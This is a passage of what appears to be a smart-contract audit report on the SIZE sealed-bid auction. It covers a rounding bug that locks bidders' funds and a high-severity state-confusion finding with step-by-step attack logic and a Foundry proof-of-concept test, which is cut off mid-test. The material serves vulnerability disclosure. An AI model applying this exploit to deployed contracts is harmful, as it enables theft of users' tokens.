class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Bidder 2 withdrew&quot;</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// will not happen</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>The test result shows the seller charged more quote token than the bidders offer so the last bidder can’t withdraw his unused quote token because the contract doesn’t have enough balance.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">Running</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">test</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">test</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SizeSealed</span><span class=\"mtk1\">.</span><span class=\"mtk12\">t</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk12\">SizeSealedTest</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    [</span><span class=\"mtk12\">FAIL</span><span class=\"mtk1\">. </span><span class=\"mtk12\">Reason</span><span class=\"mtk1\">: </span><span class=\"mtk12\">TRANSFER_FAILED</span><span class=\"mtk1\">] </span><span class=\"mtk11\">testAuditBidderMoneyLock</span><span class=\"mtk1\">() (</span><span class=\"mtk12\">gas</span><span class=\"mtk1\">: </span><span class=\"mtk7\">954985</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    Logs:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    Seller claimed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    Bidder 1 withdrew</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    Test result: FAILED. 0 passed; 1 failed; finished in 6.94ms</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    Failing tests:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    Encountered 1 failing test in src/test/SizeSealed.t.sol:SizeSealedTest</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    [FAIL. Reason: TRANSFER_FAILED] testAuditBidderMoneyLock() (</span><span class=\"mtk12\">gas</span><span class=\"mtk1\">: </span><span class=\"mtk7\">954985</span><span class=\"mtk1\">)</span></span></span></code></pre>\n<h3 id=\"tools-used\" style=\"position:relative;\"><a href=\"#tools-used\" aria-label=\"tools used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Foundry</p>\n<h3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Currently, the <code>FinalizeData</code> struct contains the <code>filledBase</code> only and calculates the <code>filledQuote</code> using the clearing price.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">struct</span><span class=\"mtk1\"> </span><span class=\"mtk12\">FinalizeData</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">reserveQuotePerBase</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalBaseAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">filledBase</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">previousQuotePerBase</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">previousIndex</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>I think we should add one more field <code>filledQuote</code> and update it during auction finalization.</p>\n<p>And the seller can recieve the sum of <code>filledQuote</code> of all bidders to avoid the rounding issue.</p>\n<p>Also, each bidder can pay the <code>filledQuote</code> of quote token and receive the <code>filledBase</code> of base token without calculating again using the clearing price.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/94#issuecomment-1319190203\">RagePit (SIZE) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-02-attacker-can-steal-any-funds-in-the-contract-by-state-confusion-no-preconditions\" style=\"position:relative;\"><a href=\"#h-02-attacker-can-steal-any-funds-in-the-contract-by-state-confusion-no-preconditions\" aria-label=\"h 02 attacker can steal any funds in the contract by state confusion no preconditions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/252\">[H-02] Attacker can steal any funds in the contract by state confusion (no preconditions)</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/252\">Trust</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/333\">V_B</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/304\">cryptonue</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/213\">PwnedNoMore</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/200\">KIntern_NA</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/171\">fs0c</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/164\">cryptphi</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/141\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/134\">JTJabba</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/128\">HE1M</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/124\">Picodes</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/96\">hansfriese</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/86\">KingNFT</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/71\">R2</a>, <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/46\">M4TZ1P</a>, and <a href=\"https://github.com/code-423n4/2022-11-size-findings/issues/15\">8olidity</a></em></p>\n<p>HIGH: Attacker can steal any funds in the contract by state confusion (no preconditions).<br>\nLOC:<br>\n<a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L33\">https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L33</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L238\">https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L238</a></p>\n<p>Auctions in SIZE can be in one of several states, as checked in the atState() modifier:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">modifier atState(Auction storage a, States _state) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (block.timestamp &lt; a.timings.startTimestamp) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (_state != States.Created) revert InvalidState();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    } else if (block.timestamp &lt; a.timings.endTimestamp) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (_state != States.AcceptingBids) revert InvalidState();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    } else if (a.data.lowestQuote != type(uint128).max) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (_state != States.Finalized) revert InvalidState();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    } else if (block.timestamp &lt;= a.timings.endTimestamp + 24 hours) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (_state != States.RevealPeriod) revert InvalidState();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    } else if (block.timestamp &gt; a.timings.endTimestamp + 24 hours) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (_state != States.Voided) revert InvalidState();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    } else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        revert();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>It’s important to note that if current block timestamp is greater than endTimestamp, <code>a.data.lowestQuote</code> is used to determine if finalize() was called.</p>\n<p>The value is set to max at createAuction.\nIn finalize, it is set again, using user-controlled input:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">// Last filled bid is the clearing price</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">a.data.lowestBase = clearingBase;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">a.data.lowestQuote = clearingQuote;</span></span></code></pre>\n<p>The issue is that it is possible to break the state machine by calling finalize() and setting lowestQuote to <code>type(uint128).max</code>. If the other parameters are crafted correctly, finalize() will succeed and perform transfers of unsold base amount and traded quote amount:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">// Transfer the left over baseToken</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">if (data.totalBaseAmount != data.filledBase) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint128 unsoldBase = data.totalBaseAmount - data.filledBase;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    a.params.totalBaseAmount = data.filledBase;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    SafeTransferLib.safeTransfer(ERC20(a.params.baseToken), a.data.seller, unsoldBase);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// Calculate quote amount based on clearing price</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">uint256 filledQuote = FixedPointMathLib.mulDivDown(clearingQuote, data.filledBase, clearingBase);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">SafeTransferLib.safeTransfer(ERC20(a.params.quoteToken), a.data.seller, filledQuote);</span></span></code></pre>\n<p>Critically, attacker will later be able to call cancelAuction() and cancelBid(), as they are allowed as long as the auction has not finalized:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function cancelAuction(uint256 auctionId) external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    Auction storage a = idToAuction[auctionId];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (msg.sender != a.data.seller) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        revert UnauthorizedCaller();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Only allow cancellations before finalization</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Equivalent to atState(idToAuction[auctionId], ~STATE_FINALIZED)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (a.data.lowestQuote != type(uint128).max) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        revert InvalidState();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Allowing bidders to cancel bids (withdraw quote)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Auction considered forever States.AcceptingBids but nobody can finalize</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    a.data.seller = address(0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    a.timings.endTimestamp = type(uint32).max;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    emit AuctionCancelled(auctionId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    SafeTransferLib.safeTransfer(ERC20(a.params.baseToken), msg.sender, a.params.totalBaseAmount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">function cancelBid(uint256 auctionId, uint256 bidIndex)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    external</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">{</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    Auction storage a = idToAuction[auctionId];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    EncryptedBid storage b = a.bids[bidIndex];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (msg.sender != b.sender) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        revert UnauthorizedCaller();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Only allow bid cancellations while not finalized or in the reveal period</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (block.timestamp &gt;= a.timings.endTimestamp) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (a.data.lowestQuote != type(uint128).max || block.timestamp &lt;= a.timings.endTimestamp + 24 hours) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            revert InvalidState();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Prevent any futher access to this EncryptedBid</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    b.sender = address(0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Prevent seller from finalizing a cancelled bid</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    b.commitment = 0;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    emit BidCancelled(auctionId, bidIndex);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    SafeTransferLib.safeTransfer(ERC20(a.params.quoteToken), msg.sender, b.quoteAmount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>The attack will look as follows:</p>\n<ol>\n<li>attacker uses two contracts - buyer and seller</li>\n<li>seller creates an auction, with no vesting period and ends in 1 second. Passes X base tokens.</li>\n<li>buyer bids on the auction, using baseAmount=quoteAmount (ratio is 1:1). Passes Y quote tokens, where Y &#x3C; X.</li>\n<li>after 1 second, seller calls reveal() and finalizes, with <strong>lowestQuote = lowestBase = 2**128-1</strong>.</li>\n<li>seller contract receives X-Y unsold base tokens and Y quote tokens</li>\n<li>seller calls cancelAuction(). They are sent back remaining totalBaseAmount, which is X - (X-Y) = Y base tokens. They now have the same amount of base tokens they started with. cancelAuction sets endTimestamp = <code>type(uint32).max</code></li>\n<li>buyer calls cancelBid. Because endTimestamp is set to max, the call succeeds. Buyer gets back Y quote tokens.</li>\n<li>The accounting shows attacker profited Y quote tokens, which are both in buyer and seller’s contract.</li>\n</ol>\n<p>Note that the values of <code>minimumBidQuote</code>, <code>reserveQuotePerbase</code> must be carefully chosen to satisfy all the inequality requirements in createAuction(), bid() and finalize(). This is why merely spotting that lowestQuote may be set to max in finalize is not enough and in my opinion, POC-ing the entire flow is necessary for a valid finding.</p>\n<p>This was the main constraint to bypass:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"9\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">uint256 quotePerBase = FixedPointMathLib.mulDivDown(b.quoteAmount, type(uint128).max, baseAmount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">data.previousQuotePerBase = quotePerBase;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">if (data.previousQuotePerBase != FixedPointMathLib.mulDivDown(clearingQuote, type(uint128).max, clearingBase)) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            revert InvalidCalldata();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span></code></pre>\n<p>Since clearingQuote must equal UINT128_MAX, we must satisfy:\n(2**128-1) * (2**128-1) / clearingBase = quoteAmount * (2**128-1) / baseAmount. The solution I found was setting clearingBase to (2**128-1) and quoteAmount = baseAmount.</p>\n<p>We also have constraints on reserveQuotePerBase. In createAuction:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"10\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">if (</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    FixedPointMathLib.mulDivDown(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        auctionParams.minimumBidQuote, type(uint128).max, auctionParams.totalBaseAmount</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) &gt; auctionParams.reserveQuotePerBase</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    revert InvalidReserve();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>While in finalize():</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"11\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">// Only fill if above reserve price</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">if (quotePerBase &lt; data.reserveQuotePerBase) continue;</span></span></code></pre>\n<p>And an important constraint on quoteAmount and minimumBidQuote:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"12\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">if (quoteAmount == 0 || quoteAmount == type(uint128).max || quoteAmount &lt; a.params.minimumBidQuote) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    revert InvalidBidAmount();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>Merging them gives us two equations to substitute variables in:</p>\n<ol>\n<li><code>minimumBidQuote / totalBaseAmount &#x3C; reserveQuotePerBase &#x3C;= UINT128_MAX / clearingBase</code></li>\n<li><code>quoteAmount > minimumBidQuote</code></li>\n</ol>\n<p>In the POC I’ve crafted parameters to steal 2**30 quote tokens, around 1000 in USDC denomination. With the above equations, increasing or decreasing the stolen amount is simple.</p>\n<h3 id=\"impact\" style=\"position:relative;\"><a href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>An attacker can steal all tokens held in the SIZE auction contract.</p>\n<h3 id=\"proof-of-concept-1\" style=\"position:relative;\"><a href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Copy the following code in SizeSealed.t.sol</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"13\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function testAttack() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    quoteToken = new MockERC20(&quot;USD Coin&quot;, &quot;USDC&quot;, 6);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    baseToken = new MockERC20(&quot;DAI stablecoin &quot;, &quot;DAI&quot;, 18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Bootstrap auction contract with some funds</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    baseToken.mint(address(auction), 1e20);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    quoteToken.mint(address(auction), 1e12);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Create attacker</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    MockSeller attacker_seller  = new MockSeller(address(auction), quoteToken, baseToken);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    MockBuyer attacker_buyer = new MockBuyer(address(auction), quoteToken, baseToken);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Print attacker balances</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 balance_quote;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 balance_base;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    (balance_quote, balance_base) = attacker_seller.balances();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    console.log(&quot;Starting seller balance: &quot;, balance_quote, balance_base);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    (balance_quote, balance_base) = attacker_buyer.balances();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    console.log(&#39;Starting buyer balance: &#39;, balance_quote, balance_base);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Create auction</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 auction_id = attacker_seller.createAuction(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        2**32,  // totalBaseAmount</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        2**120, // reserveQuotePerBase</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        2**20, // minimumBidQuote</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint32(block.timestamp), // startTimestamp</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint32(block.timestamp + 1),  // endTimestamp</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint32(block.timestamp + 1), // vestingStartTimestamp</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint32(block.timestamp + 1), // vestingEndTimestamp</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        0 // cliffPercent</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Bid on auction</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    attacker_buyer.setAuctionId(auction_id);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    attacker_buyer.bidOnAuction(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        2**30, // baseAmount</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        2**30  // quoteAmount</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Finalize with clearingQuote = clearingBase = 2**128-1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Will transfer unsold base amount + matched quote amount</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256[] memory bidIndices = new uint[](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bidIndices[0] = 0;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.warp(block.timestamp + 10);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    attacker_seller.finalize(bidIndices, 2**128-1, 2**128-1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Cancel auction</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Will transfer back sold base amount</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    attacker_seller.cancelAuction();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Cancel bid</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Will transfer back to buyer quoteAmount</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    attacker_buyer.cancel();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Net profit of 